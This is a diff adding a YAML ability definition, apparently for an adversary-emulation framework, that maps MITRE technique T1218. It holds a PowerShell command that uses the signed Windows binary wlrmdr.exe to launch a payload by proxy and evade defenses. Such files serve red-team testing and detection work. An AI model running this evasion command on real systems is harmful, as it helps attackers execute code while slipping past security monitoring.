@@ -1,0 +1,18 @@
+---
+- id: 6bf5ed83cfd5fc129f0bfcc9d2052a3f
+  name: System Binary Proxy Execution - Wlrmdr Lolbin
+  description: Use wlrmdr(Windows Logon Reminder executable) as a proxy binary to
+    evade defensive countermeasures
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      psh:
+        command: wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u "#{payload_path}"
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
